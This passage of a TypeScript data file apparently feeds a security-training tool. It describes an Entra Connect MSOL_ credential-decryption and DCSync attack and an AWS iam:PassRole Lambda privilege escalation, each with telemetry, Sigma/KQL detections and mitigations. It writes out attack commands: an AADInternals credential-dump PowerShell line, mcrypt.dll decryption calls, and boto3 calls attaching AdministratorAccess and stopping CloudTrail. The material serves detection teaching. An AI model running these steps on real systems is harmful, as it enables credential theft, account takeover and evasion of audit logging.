    'Documented by SpecterOps, Dirk-jan Mollema (_dirkjan / AADInternals), and Mandiant, Microsoft Entra Connect (formerly Azure AD Connect) bridges on-premises Active Directory with cloud Entra ID. Because the synchronization engine stores high-privilege on-premises connector credentials (MSOL_<hex>) and cloud sync credentials inside a local SQL Express LocalDB database (ADSync.mdf -> mms_management_agent) encrypted with a DPAPI-protected keyset (cryptKeySet), an attacker who compromises the Tier-0 Entra Connect server can decrypt the MSOL_ account password (which frequently holds Replicating Directory Changes All / DCSync rights) and extract the AZUREADSSOACC$ computer account hash to forge Seamless SSO Kerberos tickets for any synced cloud user.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'SpecterOps & Dirk-jan Mollema Research · Mandiant Hybrid Identity Playbook · Microsoft Tier-0 Guidance',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1003 (ADSync LocalDB Credential Dump) · T1003.006 (MSOL_ DCSync) · T1558.002 (AZUREADSSOACC$ Silver Ticket)',
    },
    {
      term: 'DATABASE ARTIFACTS',
      value: 'C:\\Program Files\\Microsoft Azure AD Sync\\Data\\ADSync.mdf (mms_management_agent & mms_server_configuration)',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'Sysmon EventID 1/10 (ADSync.mdf / mcrypt.dll access) & Windows EventID 4662 (DS-Replication-Get-Changes-All)',
    },
  ],
  nodes: [
    {
      id: 'hybrid_pivot_operator',
      label: 'On-Prem Foothold Operator',
      sublabel: '10.10.4.22 (Local Admin on Sync Server)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'Compromised Internal Admin Session',
        pidOrPort: 'PowerShell / adconnectdump.py / AADInternals',
        privilege: 'Local Administrator on AADConnect Server',
        artifacts: [
          'Invoke-AADIntAzureADConnectCredentials / adconnectdump.exe',
          'SqlLocalDB.exe info ADSync',
        ],
        description:
          'Attacker who pivoted to the Entra Connect server after treating it as a standard Tier-1 utility server rather than Tier-0.',
      },
    },
    {
      id: 'entra_connect_sync_srv',
      label: 'Entra Connect Server (ADSYNC)',
      sublabel: '10.10.0.18 (CORP-AADC01.corp.local)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Windows Server 2022 (Microsoft Azure AD Sync Service)',
        pidOrPort: 'PID 3312 (miiserver.exe / sqlservr.exe LocalDB)',
        privilege: 'NT SERVICE\\ADSync',
        artifacts: [
          'C:\\Program Files\\Microsoft Azure AD Sync\\Data\\ADSync.mdf',
          'SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent',
        ],
        description:
          'Hybrid identity synchronization appliance running miiserver.exe and SQL Server Express LocalDB under NT SERVICE\\ADSync.',
      },
    },
    {
      id: 'dpapi_mcrypt_decryptor',
      label: 'DPAPI & mcrypt.dll Keyset Engine',
      sublabel: 'KeyManager.GetActiveCredentialKey()',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'In-Memory .NET Reflection on mcrypt.dll',
        pidOrPort: 'PID 5890 (powershell.exe reflecting Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.dll)',
        privilege: 'Impersonated NT SERVICE\\ADSync DPAPI Context',
        artifacts: [
          'Registry: HKLM\\SOFTWARE\\Microsoft\\Ad Sync\\Shared\\<instance_id>',
          'Decrypted Plaintext Account: CORP\\MSOL_9a8b7c6d5e4f',
        ],
        description:
          'Loads mcrypt.dll inside the ADSync service context to unprotect the DPAPI master key and AES-decrypt mms_management_agent credentials.',
      },
    },
    {
      id: 'tier0_dc_and_entra_cloud',
      label: 'Domain Controller & Entra ID SSO',
      sublabel: 'CORP-DC01 (:389) & login.microsoftonline.com',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'On-Premises Domain Controller & Cloud Entra ID Tenant',
        pidOrPort: 'MS-DRSR DCSync & AZUREADSSOACC$ Seamless SSO',
        privilege: 'Enterprise Admin + Cloud Global Admin Equivalent',
        artifacts: [
          'MSOL_9a8b7c6d5e4f executing DRSGetNCChanges (DCSync)',
          'AZUREADSSOACC$ NTLM/AES256 hash forging Kerberos cloud tickets',
        ],
        description:
          'Attacker uses MSOL_9a8b7c6d5e4f to DCSync the on-premises domain including AZUREADSSOACC$, then forges Seamless SSO tickets into Entra ID.',
      },
    },
    {
      id: 'mdi_and_sentinel_hybrid_siem',
      label: 'Defender for Identity & Sentinel SIEM',
      sublabel: 'EventID 4662 + Entra Seamless SSO Audit',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Microsoft Defender for Identity (MDI) & Sentinel',
        pidOrPort: 'EventID 4662 (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)',
        privilege: 'Hybrid Identity SOC Monitoring',
        artifacts: [
          'EventID 4662: MSOL_ account invoking Replicating Directory Changes from non-AADC IP',
          'Sysmon EventID 7: Non-miiserver.exe process loading mcrypt.dll',
        ],
        description:
          'Monitors mcrypt.dll loads on CORP-AADC01 and alerts when the MSOL_ connector account initiates DCSync from an unexpected host.',
      },
    },
  ],
  processTree: [
    {
      pid: 3312,
      ppid: 712,
      name: 'miiserver.exe (Entra Connect Sync)',
      commandLine: '"C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\miiserver.exe"',
      user: 'NT SERVICE\\ADSync',
      integrity: 'SYSTEM',
      status: 'normal',
      activeFromStage: 1,
      apiCalls: ['CryptUnprotectData()', 'SqlConnection.Open("np:\\\\.\\pipe\\LOCALDB#...\\tsql\\query")'],
    },
    {
      pid: 5890,
      ppid: 4120,
      name: 'powershell.exe (ADConnect Dump)',
      commandLine: 'powershell.exe -ep bypass -c "Import-Module AADInternals; Get-AADIntSyncCredentials"',
      user: 'NT SERVICE\\ADSync',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 2,
      apiCalls: [
        'Assembly.LoadFile("...\\Bin\\mcrypt.dll")',
        'KeyManager.LoadKeySet()',
        'KeyManager.GetActiveCredentialKey().DecryptBase64ToString()',
      ],
      memoryBlocks: [
        {
          address: '0x0000021480910000',
          section: 'CLR Heap (Decrypted XML Configuration Blob)',
          permissions: 'RW-',
          size: '32 KB',
          status: 'injected',
          description: 'Plaintext XML decrypted from mms_management_agent containing MSOL_9a8b7c6d5e4f password.',
          hexPreview: '3C 61 74 74 72 69 62 75 74 65 3E 4D 53 4F 4C 5F (<attribute>MSOL_9a8b7c6d5e4f</attribute>)',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'QUERYING ADSYNC LOCALDB (MMS_MANAGEMENT_AGENT) BLOBS',
      subtitle: 'Connecting to SQL LocalDB pipe as NT SERVICE\\ADSync to read encrypted connector XML',
      description:
        'After gaining local administrator access on the Entra Connect server (CORP-AADC01), the attacker impersonates the NT SERVICE\\ADSync service account, connects to the ADSync SQL Express LocalDB named pipe, and extracts instance_id, keyset_id, entropy, and encrypted_configuration from mms_server_configuration and mms_management_agent.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1003',
      mitreTechniqueName: 'OS Credential Dumping (ADSync LocalDB)',
      activeNodeIds: ['hybrid_pivot_operator', 'entra_connect_sync_srv', 'mdi_and_sentinel_hybrid_siem'],
      compromisedNodeIds: ['entra_connect_sync_srv'],
      keySpecs: [
        { term: 'DATABASE FILE', value: 'C:\\Program Files\\Microsoft Azure AD Sync\\Data\\ADSync.mdf' },
        { term: 'SQL TABLES', value: 'mms_server_configuration & mms_management_agent' },
        { term: 'SERVICE CONTEXT', value: 'NT SERVICE\\ADSync (Required for LocalDB & DPAPI)' },
      ],
    },
    {
      index: 2,
      title: 'DPAPI & MCRYPT.DLL DECRYPTION OF MSOL_ CONNECTOR PASSWORD',
      subtitle: 'Reflecting KeyManager in mcrypt.dll to decrypt the on-prem MSOL_9a8b7c6d5e4f password',
      description:
        'The attacker loads Entra Connect’s own cryptography library (Bin\\mcrypt.dll) into PowerShell, invokes KeyManager.LoadKeySet() using the DPAPI-protected registry key at HKLM\\SOFTWARE\\Microsoft\\Ad Sync\\Shared, and calls DecryptBase64ToString() on encrypted_configuration to recover the plaintext password of CORP\\MSOL_9a8b7c6d5e4f.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1552.001',
      mitreTechniqueName: 'Unsecured Credentials: Credentials In Files / Registry',
      activeNodeIds: ['entra_connect_sync_srv', 'dpapi_mcrypt_decryptor', 'mdi_and_sentinel_hybrid_siem'],
      compromisedNodeIds: ['entra_connect_sync_srv', 'dpapi_mcrypt_decryptor'],
      keySpecs: [
        { term: 'CRYPTO ASSEMBLY', value: 'Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.dll (mcrypt.dll)' },
        { term: 'RECOVERED ACCOUNT', value: 'CORP\\MSOL_9a8b7c6d5e4f (AD DS Connector Account)' },
        { term: 'SYSMON INDICATOR', value: 'EventID 7: powershell.exe loading mcrypt.dll' },
      ],
    },
    {
      index: 3,
      title: 'MSOL_ DCSYNC & AZUREADSSOACC$ SEAMLESS SSO CLOUD PIVOT',
      subtitle: 'Using MSOL_ to DCSync AZUREADSSOACC$ and forge Kerberos Silver Tickets into Entra ID',
      description:
        'When Password Hash Sync is enabled, the MSOL_9a8b7c6d5e4f account holds DS-Replication-Get-Changes-All on the domain root. The attacker uses MSOL_ to DCSync the AZUREADSSOACC$ computer account hash and forges a Kerberos Silver Ticket for any synchronized hybrid administrator to authenticate to login.microsoftonline.com via Seamless SSO.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1556.007',
      mitreTechniqueName: 'Modify Authentication Process: Hybrid Identity (Seamless SSO)',
      activeNodeIds: ['dpapi_mcrypt_decryptor', 'tier0_dc_and_entra_cloud', 'mdi_and_sentinel_hybrid_siem'],
      compromisedNodeIds: ['entra_connect_sync_srv', 'dpapi_mcrypt_decryptor', 'tier0_dc_and_entra_cloud'],
      keySpecs: [
        { term: 'ON-PREM PRIVILEGE', value: 'DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)' },
        { term: 'CLOUD SSO BRIDGE', value: 'AZUREADSSOACC$ Computer Account Kerberos Key' },
        { term: 'DEFENSIVE FIX', value: 'Treat Entra Connect as Tier-0, Rotate AZUREADSSOACC$ Key Every 30 Days' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'aadc-1',
      no: 1,
      stageIndex: 1,
      timestamp: '16:20:04.112',
      sourceNodeId: 'hybrid_pivot_operator',
      targetNodeId: 'entra_connect_sync_srv',
      sourceLabel: 'Foothold Operator',
      targetLabel: 'Entra Connect (CORP-AADC01)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1',
      shortAction: 'SQLLOCALDB_PIPE_ENUM',
      info: 'Image=SqlLocalDB.exe CommandLine="SqlLocalDB.exe info ADSync" User="NT SERVICE\\ADSync"',
      sizeOrCode: 'PID 5812',
      severity: 'HIGH',
      mitreId: 'T1003',
      explanation: 'Attacker enumerates the ADSync LocalDB named pipe under the NT SERVICE\\ADSync account to read mms_management_agent.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>1</EventID><Computer>CORP-AADC01.corp.local</Computer></System><EventData><Data Name="Image">C:\\Program Files\\Microsoft SQL Server\\150\\Tools\\Binn\\SqlLocalDB.exe</Data><Data Name="CommandLine">SqlLocalDB.exe info ADSync</Data><Data Name="User">NT SERVICE\\ADSync</Data></EventData></Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Suspicious Access to Azure AD Connect LocalDB Instance',
        ruleCode: `title: Azure AD Connect ADSync LocalDB Enumeration
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\SqlLocalDB.exe'
    CommandLine|contains: 'ADSync'
  condition: selection`,
        mitigation: 'Isolate Entra Connect servers as Tier-0 assets with zero non-Tier-0 local administrators.',
      },
    },
    {
      id: 'aadc-2',
      no: 2,
      stageIndex: 2,
      timestamp: '16:20:09.540',
      sourceNodeId: 'entra_connect_sync_srv',
      targetNodeId: 'dpapi_mcrypt_decryptor',
      sourceLabel: 'CORP-AADC01',
      targetLabel: 'mcrypt.dll Decryptor',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 7 (ImageLoad)',
      shortAction: 'MCRYPT_DLL_LOADED_BY_PS',
      info: 'Image=powershell.exe ImageLoaded="C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll"',
      sizeOrCode: 'Signed: Microsoft',
      severity: 'CRITICAL',
      mitreId: 'T1552.001',
      explanation: 'Non-standard process (powershell.exe instead of miiserver.exe) loads mcrypt.dll to decrypt the MSOL_ connector password.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>7</EventID><Computer>CORP-AADC01.corp.local</Computer></System><EventData><Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="ImageLoaded">C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll</Data><Data Name="Signed">true</Data></EventData></Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Entra Connect mcrypt.dll Loaded by Non-Sync Process (ADConnectDump / AADInternals)',
        ruleCode: `title: Azure AD Connect Cryptography DLL Loaded by Uncommon Process
logsource:
  category: image_load
  product: windows
detection:
  selection:
    ImageLoaded|endswith: '\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll'
  filter:
    Image|endswith: '\\miiserver.exe'
  condition: selection and not filter`,
        mitigation: 'Alert immediately if any process other than miiserver.exe loads mcrypt.dll or reads HKLM\\SOFTWARE\\Microsoft\\Ad Sync\\Shared.',
      },
    },
    {
      id: 'aadc-3',
      no: 3,
      stageIndex: 3,
      timestamp: '16:22:31.809',
      sourceNodeId: 'dpapi_mcrypt_decryptor',
      targetNodeId: 'tier0_dc_and_entra_cloud',
      sourceLabel: 'Decrypted MSOL_ Account',
      targetLabel: 'CORP-DC01 & Entra SSO',
      sourceType: 'WIN_EVENT',
      protocolOrEventId: 'WinSec EID 4662 (DCSync)',
      shortAction: 'MSOL_DCSYNC_AZUREADSSOACC',
      info: 'SubjectUserName=MSOL_9a8b7c6d5e4f Properties={1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} SourceIP=10.10.4.22',
      sizeOrCode: 'AccessMask 0x100',
      severity: 'CRITICAL',
      mitreId: 'T1556.007',
      explanation: 'The stolen MSOL_ connector account executes DCSync from an unauthorized workstation IP to dump AZUREADSSOACC$ and forge Seamless SSO tickets.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4662</EventID><Computer>CORP-DC01.corp.local</Computer></System><EventData><Data Name="SubjectUserName">MSOL_9a8b7c6d5e4f</Data><Data Name="ObjectName">%{19195a5b-6da0-11d0-afd3-00c04fd930c9}</Data><Data Name="Properties">%%7688 {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}</Data><Data Name="AccessMask">0x100</Data></EventData></Event>`,
      detectionRule: {
        type: 'KQL',
        title: 'MSOL_ Connector Account Performing DCSync From Non-Entra-Connect Host',
        ruleCode: `SecurityEvent | where EventID == 4662 and SubjectUserName startswith "MSOL_" and Properties has "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"`,
        mitigation: 'Restrict MSOL_ account logon workstations to the Entra Connect server IP and disable Seamless SSO if modern Primary Refresh Tokens (PRT) are used.',
      },
    },
  ],
};

export const AWS_COGNITO_IAM_PASSROLE_PRIVESC_SCENARIO: AttackScenario = {
  id: 'aws-cognito-iam-passrole-privesc',
  code: 'T1098.001',
  name: 'Rhino Security Labs, Datadog & AWS — IAM PassRole + Lambda CreateFunction Privilege Escalation & CloudTrail StopLogging',
  shortSubtitle: 'Rhino Security Labs · Datadog Security Labs · MITRE Cloud · iam:PassRole + lambda:CreateFunction · AdministratorAccess',
  category: 'CLOUD_SAAS',
  severity: 'CRITICAL',
  primaryMitrePhase: 3,
  overview:
    'Documented in Rhino Security Labs’ canonical AWS IAM Privilege Escalation taxonomy, Datadog Security Labs cloud research, and MITRE ATT&CK Cloud Matrix (T1098.001 / T1562.008), an attacker who compromises a low-privilege developer IAM identity holding iam:PassRole and lambda:CreateFunction + lambda:InvokeFunction can escalate to full AWS account takeover. By creating a new AWS Lambda function bound via iam:PassRole to an existing over-privileged IAM Service Role (such as LambdaAdminDeploymentRole), the attacker’s Python handler executes boto3 calls inside the Lambda runtime to attach AdministratorAccess to their own user and invoke cloudtrail:StopLogging.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Rhino Security Labs (AWS IAM Privilege Escalation) · Datadog Security Labs · MITRE T1098.001 / T1562.008',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1078.004 (Cloud Accounts) · T1098.001 (Additional Cloud Credentials/Roles) · T1562.008 (Disable Cloud Logs)',
    },
    {
      term: 'PRIVESC PERMISSION PAIR',
      value: 'iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'AWS CloudTrail: CreateFunction20150331 -> AttachUserPolicy (AdministratorAccess) -> StopLogging',
    },
  ],
  nodes: [
    {
      id: 'lowpriv_aws_dev_key',
      label: 'Compromised Dev IAM User',
      sublabel: 'AKIAIOSFODNN7DEVUSER (ci-dev-deployer)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary Running Pacu (iam__privesc_scan)',
        pidOrPort: 'HTTPS :443 (lambda.us-east-1.amazonaws.com)',
        privilege: 'Low-Priv IAM User (iam:PassRole + lambda:*)',
        artifacts: [
          'Pacu module: exec iam__privesc_scan',
          'aws lambda create-function --role arn:aws:iam::123456789012:role/LambdaAdminDeploymentRole',
        ],
        description:
          'Developer IAM access key lacked direct IAM admin rights but was granted iam:PassRole(*) and lambda:CreateFunction.',
      },
    },
    {
      id: 'aws_iam_passrole_broker',
      label: 'AWS IAM & Lambda Control Plane',
      sublabel: 'iam:PassRole -> LambdaAdminDeploymentRole',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'AWS IAM Authorization & Lambda Provisioning API',
        pidOrPort: 'CreateFunction20150331 (Runtime: python3.12)',
        privilege: 'Delegates LambdaAdminDeploymentRole to Function',
        artifacts: [
          'requestParameters.role: arn:aws:iam::123456789012:role/LambdaAdminDeploymentRole',
          'functionName: metrics-health-sync-tmp',
        ],
        description:
          'Accepts iam:PassRole from ci-dev-deployer and binds the privileged LambdaAdminDeploymentRole to the newly uploaded Python function.',
      },
    },
    {
      id: 'malicious_lambda_runtime',
      label: 'Lambda Execution MicroVM (Firecracker)',
      sublabel: 'metrics-health-sync-tmp (boto3 handler)',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'AWS Lambda Python 3.12 Execution Environment',
        pidOrPort: 'Invoke (lambda_function.lambda_handler)',
        privilege: 'AssumedRole: LambdaAdminDeploymentRole (iam:*, cloudtrail:*)',
        artifacts: [
          'boto3.client("iam").attach_user_policy(UserName="ci-dev-deployer", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")',
          'boto3.client("cloudtrail").stop_logging(Name="org-audit-trail")',
        ],
        description:
          'Executes the attacker’s Python payload with the full permissions of the passed LambdaAdminDeploymentRole.',
      },
    },
    {
      id: 'aws_account_admin_plane',
      label: 'AWS Account Root / IAM & CloudTrail',
      sublabel: 'AdministratorAccess Attached + Trail Stopped',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'AWS IAM Policy Store & CloudTrail Logging Service',
        pidOrPort: 'AttachUserPolicy & StopLogging API',
        privilege: 'Full Account Administrator (arn:aws:iam::aws:policy/AdministratorAccess)',
        artifacts: [
          'ci-dev-deployer elevated to AdministratorAccess',
          'CloudTrail org-audit-trail IsLogging=false',
        ],
        description:
          'Target IAM user receives full administrative control while the regional CloudTrail audit stream is halted.',
      },
    },
    {
      id: 'datadog_cloud_siem_guardduty',
      label: 'CloudTrail Lake & Datadog Cloud SIEM',
      sublabel: 'PrivilegeEscalation:IAMUser/AdministrativePermissions',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'AWS GuardDuty & Datadog Cloud SIEM',
        pidOrPort: 'CloudTrail Management Events Stream',
        privilege: 'Cloud Security Posture & SCP Guardrails',
        artifacts: [
          'GuardDuty: PrivilegeEscalation:IAMUser/AdministrativePermissions',
          'Stealth:IAMUser/CloudTrailLoggingDisabled (StopLogging)',
        ],
        description:
          'Correlates CreateFunction + PassRole followed within seconds by AttachUserPolicy(AdministratorAccess) and StopLogging.',
      },
    },
  ],
  processTree: [
    {
      pid: 1,
      ppid: 0,
      name: 'python3.12 (Lambda Runtime)',
      commandLine: '/var/lang/bin/python3.12 /var/runtime/bootstrap.py lambda_function.lambda_handler',
      user: 'sbx_user1051',
      integrity: 'High',
      status: 'malicious',
      activeFromStage: 2,
      apiCalls: [
        'boto3.client("iam").attach_user_policy(PolicyArn="...AdministratorAccess")',
        'boto3.client("cloudtrail").stop_logging(Name="org-audit-trail")',
      ],
      memoryBlocks: [
        {
          address: '0x00007F8810200000',
          section: '/var/task/lambda_function.py (Bytecode)',
          permissions: 'R--',
          size: '16 KB',
          status: 'injected',
          description: 'Uploaded Lambda Python handler executing IAM privilege escalation and CloudTrail blinding.',
          hexPreview: '61 74 74 61 63 68 5F 75 73 65 72 5F 70 6F 6C 69 (attach_user_policy / stop_logging)',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'IAM PASSROLE & MALICIOUS LAMBDA FUNCTION CREATION',
      subtitle: 'Binding high-privilege LambdaAdminDeploymentRole to a new Python function via iam:PassRole',
      description:
        'Using the compromised ci-dev-deployer access key (AKIA...), the attacker runs Pacu’s iam__privesc_scan module, identifies that the user holds iam:PassRole(*) and lambda:CreateFunction, and creates a new Lambda function (metrics-health-sync-tmp) bound to the privileged LambdaAdminDeploymentRole.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1098.001',
      mitreTechniqueName: 'Account Manipulation: Additional Cloud Credentials',
      activeNodeIds: ['lowpriv_aws_dev_key', 'aws_iam_passrole_broker', 'datadog_cloud_siem_guardduty'],
      compromisedNodeIds: ['aws_iam_passrole_broker'],
      keySpecs: [
        { term: 'PRIVESC VECTOR', value: 'Rhino Security Labs Vector #13: iam:PassRole + lambda:CreateFunction' },
        { term: 'PASSED IAM ROLE', value: 'arn:aws:iam::123456789012:role/LambdaAdminDeploymentRole' },
        { term: 'CLOUDTRAIL EVENT', value: 'CreateFunction20150331 (runtime: python3.12)' },
      ],
    },
    {
      index: 2,
      title: 'LAMBDA INVOCATION & ADMINISTRATORACCESS POLICY ATTACHMENT',
      subtitle: 'Executing boto3 iam.attach_user_policy(AdministratorAccess) inside the Lambda execution role',
      description:
        'The attacker invokes metrics-health-sync-tmp via aws lambda invoke. Running inside AWS Firecracker with the STS credentials of LambdaAdminDeploymentRole, the Python handler calls iam:AttachUserPolicy to grant arn:aws:iam::aws:policy/AdministratorAccess directly to ci-dev-deployer.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1098.003',
      mitreTechniqueName: 'Account Manipulation: Additional Cloud Roles',
      activeNodeIds: ['aws_iam_passrole_broker', 'malicious_lambda_runtime', 'aws_account_admin_plane', 'datadog_cloud_siem_guardduty'],
      compromisedNodeIds: ['aws_iam_passrole_broker', 'malicious_lambda_runtime', 'aws_account_admin_plane'],
      keySpecs: [
        { term: 'API CALL', value: 'iam:AttachUserPolicy (UserName: ci-dev-deployer)' },
        { term: 'GRANTED POLICY', value: 'arn:aws:iam::aws:policy/AdministratorAccess' },
        { term: 'GUARDDUTY ALERT', value: 'PrivilegeEscalation:IAMUser/AdministrativePermissions' },
      ],
    },
    {
      index: 3,
      title: 'CLOUDTRAIL STOPLOGGING DEFENSE EVASION',
      subtitle: 'Halting regional CloudTrail audit recording via cloudtrail:StopLogging',
      description:
        'To blind SOC analysts to subsequent resource creation and data exfiltration, the escalated identity immediately invokes cloudtrail:StopLogging on the account’s primary audit trail (org-audit-trail)—a critical defense-evasion action (MITRE T1562.008) caught by the final CloudTrail event before logging stops.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1562.008',
      mitreTechniqueName: 'Impair Defenses: Disable or Modify Cloud Logs',
      activeNodeIds: ['malicious_lambda_runtime', 'aws_account_admin_plane', 'datadog_cloud_siem_guardduty'],
      compromisedNodeIds: ['aws_iam_passrole_broker', 'malicious_lambda_runtime', 'aws_account_admin_plane'],
      keySpecs: [
        { term: 'EVASION API', value: 'cloudtrail:StopLogging (Name: org-audit-trail)' },
        { term: 'MITRE TECHNIQUE', value: 'T1562.008 (Disable or Modify Cloud Logs)' },
        { term: 'ARCHITECTURAL FIX', value: 'IAM Permissions Boundary + AWS Organizations SCP Denying StopLogging' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'aws-passrole-1',
      no: 1,
      stageIndex: 1,
      timestamp: '19:31:04.220',
      sourceNodeId: 'lowpriv_aws_dev_key',
      targetNodeId: 'aws_iam_passrole_broker',
      sourceLabel: 'ci-dev-deployer',
      targetLabel: 'AWS Lambda Control Plane',
      sourceType: 'NETWORK',
      protocolOrEventId: 'CLOUDTRAIL CreateFunction',
      shortAction: 'LAMBDA_CREATE_WITH_PASSROLE',
      info: 'eventName=CreateFunction20150331 functionName=metrics-health-sync-tmp role=LambdaAdminDeploymentRole',
      sizeOrCode: 'HTTP 201 Created',
      severity: 'HIGH',
      mitreId: 'T1098.001',
      explanation: 'Low-privileged user creates a Lambda function and passes a privileged IAM role via iam:PassRole.',
      rawLog: `{"eventSource":"lambda.amazonaws.com","eventName":"CreateFunction20150331","userIdentity":{"type":"IAMUser","userName":"ci-dev-deployer"},"requestParameters":{"functionName":"metrics-health-sync-tmp","runtime":"python3.12","role":"arn:aws:iam::123456789012:role/LambdaAdminDeploymentRole","handler":"lambda_function.lambda_handler"}}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'AWS Lambda Function Created with High-Privilege IAM Role via PassRole',
        ruleCode: `title: Suspicious AWS Lambda CreateFunction with Admin Role
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventSource: 'lambda.amazonaws.com'
    eventName: 'CreateFunction20150331'
    requestParameters.role|contains: 'Admin'
  condition: selection`,
        mitigation: 'Scope iam:PassRole to specific non-admin role ARNs and require IAM Permissions Boundaries on all developer-created roles.',
      },
    },
    {
      id: 'aws-passrole-2',
      no: 2,
      stageIndex: 2,
      timestamp: '19:31:07.812',
      sourceNodeId: 'malicious_lambda_runtime',
      targetNodeId: 'aws_account_admin_plane',
      sourceLabel: 'Lambda (LambdaAdminDeploymentRole)',
      targetLabel: 'AWS IAM Service',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'CLOUDTRAIL AttachUserPolicy',
      shortAction: 'ADMIN_POLICY_ATTACHED',
      info: 'AssumedRole=LambdaAdminDeploymentRole eventName=AttachUserPolicy userName=ci-dev-deployer policyArn=.../AdministratorAccess',
      sizeOrCode: 'GuardDuty High',
      severity: 'CRITICAL',
      mitreId: 'T1098.003',
      explanation: 'The invoked Lambda function uses its execution role to attach AdministratorAccess to the attacker’s IAM user.',
      rawLog: `{"eventSource":"iam.amazonaws.com","eventName":"AttachUserPolicy","userIdentity":{"type":"AssumedRole","arn":"arn:aws:sts::123456789012:assumed-role/LambdaAdminDeploymentRole/metrics-health-sync-tmp"},"requestParameters":{"userName":"ci-dev-deployer","policyArn":"arn:aws:iam::aws:policy/AdministratorAccess"}}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'AWS IAM AdministratorAccess Policy Attached by Lambda Execution Role',
        ruleCode: `title: Lambda Execution Role Attaching AdministratorAccess Policy
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventSource: 'iam.amazonaws.com'
    eventName: 'AttachUserPolicy'
    requestParameters.policyArn|endswith: ':policy/AdministratorAccess'
  condition: selection`,
        mitigation: 'Never grant iam:AttachUserPolicy or iam:PutUserPolicy to compute execution roles (Lambda/EC2).',
      },
    },
    {
      id: 'aws-passrole-3',
      no: 3,
      stageIndex: 3,
      timestamp: '19:31:09.104',
      sourceNodeId: 'malicious_lambda_runtime',
      targetNodeId: 'aws_account_admin_plane',
      sourceLabel: 'Escalated Admin Identity',
      targetLabel: 'AWS CloudTrail Service',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'CLOUDTRAIL StopLogging',
      shortAction: 'CLOUDTRAIL_LOGGING_DISABLED',
      info: 'eventSource=cloudtrail.amazonaws.com eventName=StopLogging requestParameters.name=org-audit-trail',
      sizeOrCode: 'TRAIL_STOPPED',
      severity: 'CRITICAL',
      mitreId: 'T1562.008',
      explanation: 'Attacker invokes cloudtrail:StopLogging to disable audit telemetry across the AWS account.',
      rawLog: `{"eventSource":"cloudtrail.amazonaws.com","eventName":"StopLogging","userIdentity":{"type":"AssumedRole","arn":"arn:aws:sts::123456789012:assumed-role/LambdaAdminDeploymentRole/metrics-health-sync-tmp"},"requestParameters":{"name":"arn:aws:cloudtrail:us-east-1:123456789012:trail/org-audit-trail"}}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'AWS CloudTrail Logging Disabled via StopLogging or DeleteTrail',
        ruleCode: `title: AWS CloudTrail StopLogging Invoked
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventSource: 'cloudtrail.amazonaws.com'
    eventName:
      - 'StopLogging'
      - 'DeleteTrail'
  condition: selection`,
        mitigation: 'Use an AWS Organizations Organization Trail managed in a dedicated Log Archive account and block cloudtrail:StopLogging via Service Control Policy (SCP).',
      },
    },
  ],
};

export const SYSDIG_SCARLETEEL_AWS_EKS_TERRAFORM_SCENARIO: AttackScenario = {
  id: 'sysdig-scarleteel-aws-eks-terraform',
  code: 'T1610',
